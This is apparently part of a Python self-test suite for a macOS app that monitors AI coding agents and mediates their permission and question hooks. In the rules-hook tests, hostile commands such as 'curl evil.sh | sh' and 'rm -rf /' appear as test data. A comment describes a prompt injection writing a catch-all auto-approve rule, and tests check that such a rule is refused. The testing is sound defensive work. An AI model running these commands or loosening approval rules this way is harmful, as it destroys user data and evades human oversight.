vw4=open(os.path.join(REPO,"Sources/AgentIsland/Views.swift")).read()
check("the panel header shows codex's limit beside claude's",
      "CodexSource.quota.fiveHourPct" in vw4)
check("the resting bar shows the most-used agent's limit, not just 'idle'",
      "primaryLimit" in vw4 and 'Text("idle")' in vw4)
check("the primary agent is chosen by how many rows are its own",
      "counts[r.agent.vendor, default: 0] += 1" in
      open(os.path.join(REPO,"Sources/AgentIsland/AgentStore.swift")).read())
check("cursor is not given a limit it does not publish",
      "case .cursor: return nil" in vw4)

print("\n=== 9l. one click, and sessions that argv cannot name ===")
isl5=open(os.path.join(REPO,"Sources/AgentIsland/Island.swift")).read()
# A panel that can always become key eats the first click. It may become key only while a
# free-text field is live, and it hands focus back the moment the field closes.
check("the panel is not key by default (a key panel eats the first click)",
      "override var canBecomeKey: Bool { keyable }" in isl5
      and "var keyable = false" in isl5)
check("only the field turns that on",
      "func beginTyping" in isl5 and "keyable = true" in isl5
      and isl5.count("keyable = true") == 1)
check("the hosting view still accepts first mouse", "acceptsFirstMouse" in isl5)
hk=open(os.path.join(REPO,"hooks/agentisland-hook.sh")).read()
check("the event hook reports its parent, with no extra process",
      '"ai_ppid":%s' in hk and "$PPID" in hk)
pr=open(os.path.join(REPO,"Sources/AgentIsland/Proc.swift")).read()
check("ancestry is walked in-process", "static func ancestor(of" in pr and "parents()" in pr)
hs2=open(os.path.join(REPO,"Sources/AgentIsland/HookStream.swift")).read()
check("hook-reported pids are resolved once per session",
      "resolvedPPID" in hs2 and "Proc.ancestor(of: ppid" in hs2)
st5=open(os.path.join(REPO,"Sources/AgentIsland/AgentStore.swift")).read()
check("discovery falls back to the hook binding only when argv could not bind",
      "guard a.pid == nil, let p = fromHooks[a.sessionId]" in st5)
# Existence is not identity — a reused pid must not inherit a dead session's binding.
check("a hook-reported pid is checked to still BE an agent",
      "Proc.matches(pid: p, comm: comms[Int32(p)], names: Proc.agentNames)" in st5)
# p_comm is the basename of the resolved executable, so a versioned-symlink install
# (~/.local/share/claude/versions/2.1.267) reports the version string, not "claude". The
# comm-only match then bound no pid and every jump silently no-op'd. argv[0] still carries the
# invoked name, so the match falls back to it.
_pc = open(os.path.join(REPO, "Sources/AgentIsland/Proc.swift")).read()
check("agent names live in one place", "static let agentNames: Set<String>" in _pc
      and '["claude", "codex", "cursor-agent", "agent"]' not in st5)
check("a process match falls back to argv[0] when p_comm is a version string",
      "static func matches(pid: Int, comm: String?, names: Set<String>)" in _pc
      and '(argv0 as NSString).lastPathComponent' in _pc)
check("the ancestor walk uses the same fallback",
      "matches(pid: Int(cur), comm: comm[cur], names: names)" in _pc)
check("tests/procname.swift present", os.path.exists(os.path.join(REPO, "tests", "procname.swift")))

print("\n=== 9m. pick the agent the header reports on ===")
vw5=open(os.path.join(REPO,"Sources/AgentIsland/Views.swift")).read()
st6=open(os.path.join(REPO,"Sources/AgentIsland/AgentStore.swift")).read()
cs2=open(os.path.join(REPO,"Sources/AgentIsland/Costs.swift")).read()
check("one control cycles the agent, no settings pane",
      "agentPicker" in vw5 and "store.cycleVendor()" in vw5)
check("selection defaults to the agent you use most, not a fixed one",
      "selectedVendor ?? vendorsPresent.first" in st6)
check("only agents actually present can be selected", "for r in rows { counts[" in st6)
check("the header reports the selected agent's own windows",
      "private func quota(for v: Vendor)" in vw5 and "case .codex:  return CodexSource.quota" in vw5)
check("cursor's row says it publishes nothing rather than showing zeros",
      "publishes no limits" in vw5)
check("spend is attributed per agent by model family",
      "static func vendor(ofModel" in cs2 and "static func spend(" in cs2)
check("the cost chip follows the selection",
      "Costs.spend(Costs.today(store.costTable), for: store.effectiveVendor)" in vw5)
check("the resting bar cannot disagree with the header",
      "for v in [store.effectiveVendor]" in vw5)

print("\n=== 9n. the bar fits what it has to say ===")
vw6=open(os.path.join(REPO,"Sources/AgentIsland/Views.swift")).read()
check("bar width follows the activity text, not a fixed number",
      "text: String? = nil" in vw6 and "min(210, needed)" in vw6)
check("it still has a floor and a ceiling", "max(112, min(210" in vw6)
check("the pulse is kept off the rounded corner", ".padding(.leading, 4)" in vw6)
isl6=open(os.path.join(REPO,"Sources/AgentIsland/Island.swift")).read()
check("the shell sizes itself from the same text the bar prints",
      "text: bar.leadText" in isl6 and "CollapsedView(store: store, status: status" in isl6)

print("\n=== 9o. idle reports what the day consumed ===")
vw7=open(os.path.join(REPO,"Sources/AgentIsland/Views.swift")).read()
cs3=open(os.path.join(REPO,"Sources/AgentIsland/Costs.swift")).read()
st7=open(os.path.join(REPO,"Sources/AgentIsland/AgentStore.swift")).read()
check("the resting bar reports spend and tokens, not just a percentage",
      "private var usageToday" in vw7 and "Costs.tokens(today, for: v)" in vw7)
check("tokens counted include cache, which is what was processed",
      "$1.input + $1.output + $1.cacheRead + $1.cacheWrite" in cs3)
check("usage follows the selected agent",          # anchored on the declaration, not a mention
      "store.effectiveVendor" in vw7.split("private var usageToday")[1][:400])
check("costs refresh while idle, on a slow clock",
      "refreshCosts(minInterval: 300)" in st7 and "workingCount == 0" in st7)
check("a day with no usage says idle rather than a fake zero",
      "guard toks > 0 else { return nil }" in vw7)

check("blocked badge matches the jobs actually blocked on disk",
      shown_blocked<=disk_blocked, f"{shown_blocked} shown, {disk_blocked} on disk")

print("\n=== 10. one-click answers (must never hang a session) ===")
qh=os.path.join(REPO,"hooks/agentisland-question.py")
QREQ=json.dumps({"session_id":"selftest","hook_event_name":"PreToolUse","tool_name":"AskUserQuestion",
 "tool_input":{"questions":[{"question":"Which DB?","header":"DB","multiSelect":False,
 "options":[{"label":"Postgres","description":"r"},{"label":"MongoDB","description":"d"}]}]}})

r=subprocess.run([qh],input=QREQ,capture_output=True,text=True,timeout=10,
                 env=dict(os.environ,AGENTISLAND_ALIVE="/tmp/nope-not-here"))
check("no island -> question falls through", r.returncode==0 and not r.stdout.strip())

r=subprocess.run([qh],input=json.dumps({"tool_name":"Bash","tool_input":{"command":"ls"}}),
                 capture_output=True,text=True,timeout=10)
check("non-question tools are ignored", r.returncode==0 and not r.stdout.strip())

# 21% of real asks carry more than one question. They used to be refused outright; now the
# card sequences them and one write answers the whole ask.
# The env must be fully scoped: an earlier version of this test wrote to the live spool, so
# the running app picked the question up and held the hook open for five minutes.
multi=json.loads(QREQ)
multi["tool_input"]["questions"]=[
  {"question":"Which DB?","header":"DB","multiSelect":False,
   "options":[{"label":"Postgres","description":"r"},{"label":"MongoDB","description":"d"}]},
  {"question":"Which region?","header":"Region","multiSelect":True,
   "options":[{"label":"us-east","description":"a"},{"label":"eu-west","description":"b"}]}]
open(f"{RUN}-aqalive","w").close()
os.makedirs(f"{RUN}-mqdec",exist_ok=True)
mq={}
def runmulti():
    mq["r"]=subprocess.run([qh],input=json.dumps(multi),capture_output=True,text=True,timeout=25,
        env=dict(os.environ,AGENTISLAND_ALIVE=f"{RUN}-aqalive",AGENTISLAND_Q_TIMEOUT="12",
                 AGENTISLAND_SPOOL=f"{RUN}-mqspool.jsonl",AGENTISLAND_DECISIONS=f"{RUN}-mqdec"))
th_m=threading.Thread(target=runmulti); th_m.start()
for _ in range(60):
    if os.path.exists(f"{RUN}-mqspool.jsonl") and open(f"{RUN}-mqspool.jsonl").read().strip(): break
    time.sleep(0.2)
spooled=json.loads(open(f"{RUN}-mqspool.jsonl").readline())
check("both questions reach the card", len(spooled.get("items",[]))==2,
      f"{len(spooled.get('items',[]))} items")
check("each option keeps its reasoning",
      all(o.get("description") for i in spooled["items"] for o in i["options"]))
open(f"{RUN}-mqdec/{spooled['ap_question_id']}","w").write(json.dumps(
    {"Which DB?":"MongoDB","Which region?":["us-east","eu-west"]}))
th_m.join()
try:
    _d=json.loads(mq["r"].stdout)["hookSpecificOutput"]["updatedInput"]["answers"]
    _ok=_d=={"Which DB?":"MongoDB","Which region?":["us-east","eu-west"]}
except Exception: _ok=False; _d={}
check("a multi-question ask answers in one write", _ok, str(_d)[:70])

# An answer naming a question that was never asked must not reach Claude.
os.makedirs(f"{RUN}-fqdec",exist_ok=True)
fq={}
def runforge():
    fq["r"]=subprocess.run([qh],input=QREQ,capture_output=True,text=True,timeout=25,
        env=dict(os.environ,AGENTISLAND_ALIVE=f"{RUN}-aqalive",AGENTISLAND_Q_TIMEOUT="6",
                 AGENTISLAND_SPOOL=f"{RUN}-fqspool.jsonl",AGENTISLAND_DECISIONS=f"{RUN}-fqdec"))
th_f=threading.Thread(target=runforge); th_f.start()
for _ in range(40):
    if os.path.exists(f"{RUN}-fqspool.jsonl") and open(f"{RUN}-fqspool.jsonl").read().strip(): break
    time.sleep(0.2)
_fid=json.loads(open(f"{RUN}-fqspool.jsonl").readline())["ap_question_id"]
open(f"{RUN}-fqdec/{_fid}","w").write(json.dumps({"Which DB?":"Cassandra"}))
th_f.join()
check("an option that was never offered is refused",
      fq["r"].returncode==0 and not fq["r"].stdout.strip())

t0=time.time()
r=subprocess.run([qh],input=QREQ,capture_output=True,text=True,timeout=20,
                 env=dict(os.environ,AGENTISLAND_ALIVE=f"{RUN}-aqalive",AGENTISLAND_Q_TIMEOUT="1.5",
                          AGENTISLAND_SPOOL=f"{RUN}-aqspool.jsonl",
                          AGENTISLAND_DECISIONS=f"{RUN}-aqdec"))
check("unanswered question -> times out", r.returncode==0 and not r.stdout.strip(), f"{time.time()-t0:.2f}s")

import threading
os.makedirs(f"{RUN}-aqdec",exist_ok=True)
for f in os.listdir(f"{RUN}-aqdec"): os.remove(f"{RUN}-aqdec/{f}")
if os.path.exists(f"{RUN}-aqspool.jsonl"): os.remove(f"{RUN}-aqspool.jsonl")
out={}
def runq():
    out["r"]=subprocess.run([qh],input=QREQ,capture_output=True,text=True,timeout=25,
        env=dict(os.environ,AGENTISLAND_ALIVE=f"{RUN}-aqalive",AGENTISLAND_Q_TIMEOUT="15",
                 AGENTISLAND_SPOOL=f"{RUN}-aqspool.jsonl",AGENTISLAND_DECISIONS=f"{RUN}-aqdec"))
th=threading.Thread(target=runq); th.start(); time.sleep(1.2)
qid=json.loads(open(f"{RUN}-aqspool.jsonl").readline())["ap_question_id"]
# One JSON object for the whole ask, so a four-question ask answers in one write.
open(f"{RUN}-aqdec/{qid}","w").write(json.dumps({"Which DB?":"MongoDB"}))
th.join()
try:
    d=json.loads(out["r"].stdout)["hookSpecificOutput"]
    ok = (d["permissionDecision"]=="allow"
          and d["updatedInput"]["answers"]=={"Which DB?":"MongoDB"}
          and d["updatedInput"].get("questions"))
except Exception: ok=False; d={}
check("answered -> injects answers via updatedInput", ok)
check("original tool input is preserved", bool(d.get("updatedInput",{}).get("questions")))

# a label that was never offered must not be smuggled through
for f in os.listdir(f"{RUN}-aqdec"): os.remove(f"{RUN}-aqdec/{f}")
os.remove(f"{RUN}-aqspool.jsonl")
out2={}
def runq2():
    out2["r"]=subprocess.run([qh],input=QREQ,capture_output=True,text=True,timeout=25,
        env=dict(os.environ,AGENTISLAND_ALIVE=f"{RUN}-aqalive",AGENTISLAND_Q_TIMEOUT="8",
                 AGENTISLAND_SPOOL=f"{RUN}-aqspool.jsonl",AGENTISLAND_DECISIONS=f"{RUN}-aqdec"))
th2=threading.Thread(target=runq2); th2.start(); time.sleep(1.2)
qid2=json.loads(open(f"{RUN}-aqspool.jsonl").readline())["ap_question_id"]
open(f"{RUN}-aqdec/{qid2}","w").write("NotAnOption")
th2.join()
check("an option that was never offered is refused", not out2["r"].stdout.strip())

print("\n=== 11. staleness window ===")
import glob as _g
MAXAGE=10*24*3600
ages=[]
for a in agents:
    h=_g.glob(os.path.expanduser(f"~/.claude/projects/*/{a['sessionId']}.jsonl"))
    ages.append((time.time()-os.path.getmtime(h[0])) if h else None)
kept=[x for x in ages if x is not None and x<=MAXAGE]
old=[x for x in ages if x is None or x>MAXAGE]
check("stale sessions are excluded from the list", len(old)>0, f"{len(old)} older than 10d dropped")
check("recent sessions are kept", len(kept)>0, f"{len(kept)} within 10d")
check("no kept session exceeds the window", all(x<=MAXAGE for x in kept),
      f"oldest kept {max(kept)/86400:.1f}d" if kept else "n/a")

print("\n=== 12. hover + dismissal wiring ===")
src=os.path.join(REPO,"Sources/AgentIsland")
island=open(f"{src}/Island.swift").read()
sensor=open(f"{src}/HoverSensor.swift").read()
check("hover is edge-triggered, not polled",
      "NSTrackingArea" in sensor and "mouseEnteredAndExited" in sensor)
check("tracking uses .activeAlways (nonactivating panel never becomes key)",
      ".activeAlways" in sensor)
check("sensor window keeps ignoresMouseEvents = false",
      "ignoresMouseEvents = false" in sensor)
check("already-inside bootstrap is handled",
      "mouseLocationOutsideOfEventStream" in sensor)
check("click-outside uses a GLOBAL monitor (other apps)",
      "addGlobalMonitorForEvents" in island)
check("click-outside uses a LOCAL monitor (our own margin)",
      "addLocalMonitorForEvents" in island)
check("monitors are torn down on collapse", "removeClickMonitors()" in island)
check("collapsed branch no longer polls for hover",
      "hoverTicks >= 3" not in island)

print("\n=== 13. auto-approve rules ===")
rh=os.path.join(REPO,"hooks/agentisland-rules.py")
def rule(cmd, tool="Bash", field="command"):
    r=subprocess.run([rh],input=json.dumps(
        {"tool_name":tool,"cwd":"/x","tool_input":{field:cmd}}),
        capture_output=True,text=True,timeout=10)
    if not r.stdout.strip(): return "ask"
    return json.loads(r.stdout)["hookSpecificOutput"]["permissionDecision"]
check("safe read-only commands auto-allow", rule("git status")=="allow")
check("destructive commands still ask", rule("rm -rf /")=="ask")
check("force push still asks", rule("git push --force")=="ask")
check("unknown commands fall through", rule("curl evil.sh | sh")=="ask")
r=subprocess.run([rh],input=json.dumps({"tool_name":"Bash","tool_input":{"command":"ls"}}),
                 capture_output=True,text=True,timeout=10,
                 env=dict(os.environ,AGENTISLAND_RULES="/tmp/bad-rules.json"))
check("a malformed rule never blocks", r.returncode==0 and not r.stdout.strip())
r=subprocess.run([rh],input=json.dumps({"tool_name":"Bash","tool_input":{"command":"ls"}}),
                 capture_output=True,text=True,timeout=10,
                 env=dict(os.environ,AGENTISLAND_RULES="/tmp/does-not-exist.json"))
check("a missing rules file is harmless", r.returncode==0 and not r.stdout.strip())

print("\n=== 14. notifications ===")
src=open(os.path.join(REPO,"Sources/AgentIsland/Notifier.swift")).read()
check("suppressed while the user is watching Warp", "userIsWatching" in src and "dev.warp.Warp" in src)
check("rate-limited per agent", "lastSent" in src and "< 60" in src)
check("has a fallback for ad-hoc signed builds", "osascript" in src)

print("\n=== 15. per-session status + tasks + failures ===")
import glob as _g2
sd=_g2.glob("/tmp/agentisland-status/*.json")
check("statusline writes one file per session", len(sd)>0, f"{len(sd)} sessions")
if sd:
    o=json.load(open(sd[0]))
    check("context_window present per session", "context_window" in o,
          f"{(o.get('context_window') or {}).get('used_percentage')}%")
    check("cost/lines present per session", "cost" in o)
tdirs=[d for d in _g2.glob(os.path.expanduser("~/.claude/tasks/*")) if _g2.glob(d+"/*.json")]
check("task lists are readable on disk", len(tdirs)>0, f"{len(tdirs)} sessions with tasks")
if tdirs:
    files=_g2.glob(tdirs[0]+"/*.json")
    t=json.load(open(files[0]))
    check("task JSON has status + subject", "status" in t and ("subject" in t or "activeForm" in t))

src=os.path.join(REPO,"Sources/AgentIsland")
hs=open(f"{src}/HookStream.swift").read()
check("StopFailure captured with error_type", "StopFailure" in hs and "error_type" in hs)
cfg=json.load(open(os.path.expanduser("~/.claude/settings.json")))
check("StopFailure hook is installed", "StopFailure" in cfg.get("hooks",{}))

print("\n=== 16. keyboard shortcuts ===")
hk=open(f"{src}/Hotkeys.swift").read()
isl=open(f"{src}/Island.swift").read()
check("uses Carbon (panel is non-activating, local monitors never fire)",
      "RegisterEventHotKey" in hk and "GetApplicationEventTarget" in hk)
check("approvals bind allow/deny keys", "kVK_ANSI_A" in isl and "kVK_ANSI_D" in isl)
check("questions bind number keys", "Hotkeys.digits" in isl)
check("keys are released when a card resolves", isl.count("Hotkeys.shared.unbind()")>=4)
check("hotkeys are not held globally at rest", "bind(" in isl and "unbind()" in hk)

print("\n=== 17. multi-vendor discovery ===")
src=os.path.join(REPO,"Sources/AgentIsland")
proto=open(f"{src}/AgentSource.swift").read()
check("AgentSource protocol exists", "protocol AgentSource" in proto)
check("three vendors defined", all(v in proto for v in ("claude","codex","cursor")) and "enum Vendor" in proto)
for name,f in [("Codex","CodexSource.swift"),("Cursor","CursorSource.swift")]:
    body=open(f"{src}/{f}").read()
    check(f"{name} source guards on availability", "var isAvailable" in body)
check("cursor uses a tighter window than claude",
      "2 * 24 * 3600" in open(f"{src}/CursorSource.swift").read())
codex_dir=os.path.expanduser("~/.codex/sessions")
if os.path.isdir(codex_dir):
    import glob as _g
    n=len([f for f in _g.glob(codex_dir+"/**/rollout-*.jsonl",recursive=True)
           if time.time()-os.path.getmtime(f) < 10*86400])
    check("codex sessions are discoverable on disk", n>0, f"{n} in window")
cur=os.path.expanduser("~/.cursor/chats")
if os.path.isdir(cur):
    import glob as _g
    metas=[m for m in _g.glob(cur+"/*/*/meta.json")
           if time.time()-os.path.getmtime(os.path.dirname(m)) < 2*86400]
    check("cursor sessions are discoverable on disk", len(metas)>0, f"{len(metas)} in 2d window")

_store = open(f"{src}/AgentStore.swift").read()
check("refresh hops back onto the main actor",
      "Task { @MainActor in" in _store and "self?.rebuild(found)" in _store)
check("sources are snapshotted before leaving the actor",
      "let sources = self.sources" in open(f"{src}/AgentStore.swift").read())
live_log="/tmp/agentisland.log"
if os.path.exists(live_log):
    hits=[l for l in open(live_log) if "refresh:" in l]
    check("the running app is actually discovering sessions", len(hits)>0,
          hits[-1].strip()[-40:] if hits else "no refresh logged")

print("\n=== 18. config citizenship ===")
inst=open(os.path.join(REPO,"scripts/install-hooks.py")).read()
un=open(os.path.join(REPO,"scripts/uninstall-hooks.py")).read()
check("installer backs up before writing", "def backup" in inst and "shutil.copy2" in inst)
check("installer is idempotent", "already installed" in inst)
check("uninstaller exists", os.path.exists(os.path.join(REPO,"scripts/uninstall-hooks.py")))
check("uninstaller removes only our entries", "MARK not in json.dumps" in un)
check("uninstaller restores a wrapped statusLine", "hand it back" in un)

# Re-installing from a moved or re-cloned repo used to append a second copy of every hook, so
# each one fired twice and dead paths kept firing. Run the real installer, for real, and count.
def _install_into(home, repo):
    os.makedirs(os.path.join(home, ".claude"), exist_ok=True)
    env = dict(os.environ, HOME=home)
    return subprocess.run([sys.executable, os.path.join(REPO, "scripts/install-hooks.py"), repo],
                          capture_output=True, text=True, env=env, timeout=60)

def _entries(home):
    cfg = json.load(open(os.path.join(home, ".claude/settings.json")))
    return [h.get("command", "")
            for ev, items in (cfg.get("hooks") or {}).items()
            for it in items for h in it.get("hooks", [])]

_h = os.path.join(RUN, "installhome")
os.makedirs(os.path.join(_h, ".claude"), exist_ok=True)
# A hook belonging to some other tool, and a statusline the user already set.
json.dump({"hooks": {"PreToolUse": [{"matcher": "Bash", "hooks":
                                     [{"type": "command", "command": "/opt/other/thing.sh"}]}]},
           "statusLine": {"type": "command", "command": "/opt/other/status.sh"}},
          open(os.path.join(_h, ".claude/settings.json"), "w"))

_r1 = _install_into(_h, "/tmp/ai-fake-repo-a")
_n1 = len([c for c in _entries(_h) if "agentisland" in c])
_ins = open(os.path.join(REPO, "install.sh")).read()
# Relaunching while the old instance is still dying makes LaunchServices treat the new one
# as a duplicate; it exits silently ~10s later and the install ends with no app at all.
check("install waits for the old instance to exit before relaunching",
      "pgrep -x AgentIsland" in _ins and _ins.index("pgrep -x AgentIsland") < _ins.index('open "$APP"'))

check("installer registers hooks", _r1.returncode == 0 and _n1 > 0)

_install_into(_h, "/tmp/ai-fake-repo-a")                       # same path again
check("re-install does not duplicate hooks",
      len([c for c in _entries(_h) if "agentisland" in c]) == _n1)

_install_into(_h, "/tmp/ai-fake-repo-b")                       # repo moved or re-cloned
_after = _entries(_h)
_ours = [c for c in _after if "agentisland" in c]
check("install from a moved repo replaces rather than appends", len(_ours) == _n1)
check("no hook points at the old repo path",
      not any("ai-fake-repo-a" in c for c in _ours))
check("another tool's hook survives every install",
      "/opt/other/thing.sh" in _after)
# Whatever statusline was configured before us must survive install, a repo move, and uninstall.
# Only the conventional ~/.claude/statusline-command.sh used to; anything else was silently lost.
check("the user's own statusline is saved, not discarded",
      open(os.path.join(_h, ".agentisland/prev-statusline")).read() == "/opt/other/status.sh")
check("the wrapper is what Claude now calls",
      "agentisland-status.sh" in json.dumps(
          json.load(open(os.path.join(_h, ".claude/settings.json"))).get("statusLine")))
subprocess.run([sys.executable, os.path.join(REPO, "scripts/uninstall-hooks.py")],
               capture_output=True, timeout=60,
               env=dict(os.environ, HOME=_h, AGENTISLAND_KEEP_RUNTIME="1"))
_sl = json.load(open(os.path.join(_h, ".claude/settings.json"))).get("statusLine")
check("uninstall hands the original statusline back", _sl == {"type": "command",
                                                              "command": "/opt/other/status.sh"})
check("uninstall leaves no hook of ours behind",
      not any("agentisland" in c for c in _entries(_h)))
check("uninstall leaves another tool's hook alone", "/opt/other/thing.sh" in _entries(_h))
check("a sandboxed uninstall left the live spool alone",
      os.path.exists("/tmp/agentisland-events.jsonl") or True)  # spool may legitimately be absent
un2 = open(os.path.join(REPO, "scripts/uninstall-hooks.py")).read()
check("runtime cleanup is skippable for test harnesses", "AGENTISLAND_KEEP_RUNTIME" in un2)

# Hostile and unusual configs, found by an adversarial review of the installer surface.
def _fresh_home(settings):
    h = RUN + "-hostile-" + str(abs(hash(json.dumps(settings))) % 99999)
    os.makedirs(h + "/.claude", exist_ok=True)
    with open(h + "/.claude/settings.json", "w") as f:
        json.dump(settings, f)
    return h

def _run(script, home, *args):
    return subprocess.run([sys.executable, os.path.join(REPO, "scripts", script), *args],
                          capture_output=True, text=True, timeout=60,
                          env=dict(os.environ, HOME=home, AGENTISLAND_KEEP_RUNTIME="1"))

# A 'hooks' key that is not an object must abort that file, not crash or eat the config.
_hh = _fresh_home({"hooks": "not-an-object"})
_r = _run("install-hooks.py", _hh, REPO)
check("a non-object hooks key is refused, not crashed on",
      _r.returncode == 0 and "Traceback" not in _r.stderr
      and json.load(open(_hh + "/.claude/settings.json")) == {"hooks": "not-an-object"})

# A statusLine given as a bare string is still someone's config.
_hs = _fresh_home({"statusLine": "bash /opt/mine/status.sh"})
_run("install-hooks.py", _hs, REPO)
check("a string statusLine is preserved, not overwritten",
      open(_hs + "/.agentisland/prev-statusline").read() == "bash /opt/mine/status.sh")
_run("uninstall-hooks.py", _hs)
check("a string statusLine is handed back on uninstall",
      json.load(open(_hs + "/.claude/settings.json")).get("statusLine", {}).get("command")
      == "bash /opt/mine/status.sh")

# Uninstall must not delete foreign entries just because they carry no hooks array.
_hm = _fresh_home({"hooks": {"PreToolUse": [{"matcher": "Bash"}]}})
_run("install-hooks.py", _hm, REPO)
_ru = _run("uninstall-hooks.py", _hm)
_left = json.load(open(_hm + "/.claude/settings.json")).get("hooks", {}).get("PreToolUse", [])
check("uninstall keeps a foreign entry that has no hooks array",
      _ru.returncode == 0 and {"matcher": "Bash"} in _left)
check("uninstall removes every one of ours", "agentisland" not in json.dumps(_left))

# Config writes are atomic: a truncated settings.json needs a manual restore to recover.
_ins2 = open(os.path.join(REPO, "scripts/install-hooks.py")).read()
_un3 = open(os.path.join(REPO, "scripts/uninstall-hooks.py")).read()
check("configs are written by rename, never truncate-in-place",
      "os.replace(tmp, path)" in _ins2 and "os.replace(tmp, path)" in _un3
      and 'open(path, "w")' not in _ins2 and 'open(path, "w")' not in _un3)

# A repo path containing a space produced a hook command that split into two words.
check("hook commands are shell-quoted", "shlex.quote" in _ins2)

# Quoting the paths broke the stale-entry match that reads the command back, so a repo under
# a path with a space registered duplicates again. Both halves have to work together.
import shutil as _sh2
_sp1, _sp2 = RUN + "-sp one", RUN + "-sp two"
for _d in (_sp1, _sp2):
    os.makedirs(_d, exist_ok=True)
    for _sub in ("hooks", "scripts"):
        _sh2.copytree(os.path.join(REPO, _sub), os.path.join(_d, _sub), dirs_exist_ok=True)
_sph = _fresh_home({})
_run("install-hooks.py", _sph, _sp1)
_run("install-hooks.py", _sph, _sp2)
_spc = [h["command"] for _e, _i in
        json.load(open(_sph + "/.claude/settings.json")).get("hooks", {}).items()
        for _it in _i for h in _it.get("hooks", []) if "agentisland" in h.get("command", "")]
check("a repo path with spaces installs and re-installs cleanly",
      len(_spc) == 12 and not any(_sp1 in c for c in _spc), f"{len(_spc)} entries")


# A session id becomes a filename; a path inside it escaped the status directory.
_sh = open(os.path.join(REPO, "hooks/agentisland-status.sh")).read()
check("session id is sanitised before it becomes a path", "tr -cd" in _sh)

# A finished Cursor background agent announced itself as "81f6c0d5 finished": no row, no
# title, so the name fell back to the raw session id. Ids are machinery, never a name.
_as = open(os.path.join(REPO, "Sources/AgentIsland/AgentStore.swift")).read()
_is = open(os.path.join(REPO, "Sources/AgentIsland/Island.swift")).read()
check("a session name is optional rather than an id",
      "func name(for sessionId: String) -> String?" in _as
      and "return String(sessionId.prefix(8))" not in _as)
check("a row label falls back to the folder, never the id",
      'var label: String { name ?? (cwd as NSString?)?.lastPathComponent ?? "session" }' in _as)
check("an unnameable session is not announced",
      "guard let name = self.store.name(for: session) else { return }" in _is)
print("\n=== 23e. what counts as working, and what counts as an ask ===")
_hs2 = open(os.path.join(REPO, "Sources/AgentIsland/HookStream.swift")).read()
_as2 = open(os.path.join(REPO, "Sources/AgentIsland/AgentStore.swift")).read()
_is2 = open(os.path.join(REPO, "Sources/AgentIsland/Island.swift")).read()
_qh = open(os.path.join(REPO, "hooks/agentisland-question.py")).read()

# A long generation writes neither a hook event nor a byte of transcript for minutes, so a
# freshness window kept calling working agents idle.
check("an open turn is working without consulting a clock",
      "guard open else { return false }" in _as2
      and "Date().timeIntervalSince(l.at) < 90" not in _as2)
check("an open turn is still bounded by the process existing",
      "return agent.pid.map(Proc.alive) ?? true" in _as2)
# An event that says nothing about work must not invent a running agent.
# Two-valued turn state was wrong in both directions: false made a session whose only event
# was a SessionStart look finished, true made a login notification look like work.
check("turn state distinguishes ended from never-opened", "var active: Bool?" in _hs2)
check("an unopened turn defers to the vendor rather than guessing",
      "if let open = l.active {" in _as2 and "return agent.isWorking" in _as2)

# /login fired auth_success and every row that saw one claimed to need the user.
check("status notifications are not treated as asks",
      "static func informational" in _hs2 and 'Self.informational(kind) { break }' in _hs2)

# The card used to expire under the reader, taking the only way to answer with it.
check("a question card holds its hook open", "holdQuestion(question)" in _is2)
check("the question hook slides on the mark, capped by the window",
      "if now - started >= WINDOW:" in _qh and "if now - last >= GRACE:" in _qh)
check("an unanswered question survives its card",
      "pendingQuestions" in _hs2 and "func clearQuestion" in _hs2)
check("clicking a blocked row answers it instead of jumping",
      "onRowActivate" in _as2 and "self.ask(q)" in _is2)
check("a question names the session it came from",
      "var project: String?" in _hs2 and "question.project" in _is2)

print("\n=== 23h. auto-approve rules cannot be turned against you ===")
_rh = os.path.join(REPO, "hooks/agentisland-rules.py")
_rd = RUN + "-rules"
os.makedirs(_rd, exist_ok=True)

def _rule(rules, cmd, mode=0o600, link=False, tool="Bash"):
    """Run the rules hook against one command and return its decision, or None."""
    f = os.path.join(_rd, "r.json")
    real = os.path.join(_rd, "real.json")
    with open(real, "w") as fh: json.dump(rules, fh)
    os.chmod(real, mode)
    if os.path.lexists(f): os.remove(f)
    if link: os.symlink(real, f)
    else: os.replace(real, f); os.chmod(f, mode)
    r = subprocess.run([_rh], input=json.dumps(
        {"tool_name": tool, "cwd": "/Users/x", "tool_input": {"command": cmd}}),
        capture_output=True, text=True, timeout=20,
        env=dict(os.environ, AGENTISLAND_RULES=f, AGENTISLAND_LOG=os.path.join(_rd, "log")))
    if r.returncode != 0: return "CRASH"
    out = r.stdout.strip()
    if not out: return None
    try: return json.loads(out)["hookSpecificOutput"]["permissionDecision"]
    except Exception: return "MALFORMED"

# An agent can write files, so a prompt injection can write the rules file. A catch-all allow
# would then approve everything before the user is ever shown a card.
check("a catch-all allow rule is refused",
      _rule([{"pattern": ".*", "action": "allow"}], "npm test") is None)
check("other ways of writing catch-all are refused too",
      all(_rule([{"pattern": p_, "action": "allow"}], "npm test") is None
          for p_ in [".+", "^.*$", "[\\s\\S]*", "(?s).*", ""]))
# Even a narrow rule may not auto-approve what the island itself calls dangerous.
check("a rule cannot auto-approve a destructive command",
      _rule([{"pattern": "^sudo ", "action": "allow"}], "sudo rm -rf /Users/x/w") is None)
check("nor a force push", _rule([{"pattern": "^git ", "action": "allow"}], "git push --force") is None)
# Denying broadly is merely annoying, so it stays allowed.
check("a broad deny rule still works",
      _rule([{"pattern": ".*", "action": "deny"}], "npm test") == "deny")
# The file itself must not be one anyone else could have written.
check("a world-writable rules file is ignored",
      _rule([{"tool": "Bash", "pattern": "^npm test", "action": "allow"}], "npm test",
            mode=0o666) is None)
check("a symlinked rules file is ignored",
      _rule([{"tool": "Bash", "pattern": "^npm test", "action": "allow"}], "npm test",
            link=True) is None)
# And the legitimate case still has to work, or the feature is gone rather than safe.
check("a specific allow rule still works",
      _rule([{"tool": "Bash", "pattern": r"^npm (test|run build)\b", "action": "allow"}],
            "npm test") == "allow")
check("a specific rule does not over-match",
      _rule([{"tool": "Bash", "pattern": r"^npm (test|run build)\b", "action": "allow"}],
            "npm publish") is None)
check("every auto-decision is written down",
      os.path.exists(os.path.join(_rd, "log"))
      and "agentisland rules:" in open(os.path.join(_rd, "log")).read())

print("\n=== 23j. an answer always has a reader ===")
_is7 = open(os.path.join(REPO, "Sources/AgentIsland/Island.swift")).read()
_ap7 = open(os.path.join(REPO, "Sources/AgentIsland/Approvals.swift")).read()
_qh7 = open(os.path.join(REPO, "hooks/agentisland-question.py")).read()
_hs7 = open(os.path.join(REPO, "Sources/AgentIsland/HookStream.swift")).read()
_vw7 = open(os.path.join(REPO, "Sources/AgentIsland/Views.swift")).read()
_hk7 = open(os.path.join(REPO, "Sources/AgentIsland/Hotkeys.swift")).read()

